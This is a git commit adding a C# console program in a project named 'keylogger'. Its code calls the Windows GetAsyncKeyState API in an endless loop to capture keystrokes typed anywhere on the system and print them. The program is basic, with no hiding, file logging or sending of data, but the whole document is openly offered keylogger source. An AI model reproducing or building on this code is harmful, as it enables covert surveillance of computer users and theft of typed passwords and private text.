283efa0287ee7723ac3c6879bbfc9d726abd03aa
Михаил Любачев <liubachev@live.ru>
2020-02-09 18:12:53 +0300

    Добавьте файлы проекта.

---
+++ keylogger/Program.cs
@@ -0,0 +1,30 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+namespace keylogger
+{
+    class Program
+    {
+
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+
+        static string keyLog = "";
+        static void Main(string[] args)
+        {
+            while (true)
+            {
+                Thread.Sleep(5);
+                for (int i = 32; i < 127; i++)
+                {
+                    int keyState = GetAsyncKeyState(i);
+                    if (keyState == 32768)
+                    {
+                        Console.Write((char)i + " ");
+                    }
+                }
+            }
+        }
+    }
+}
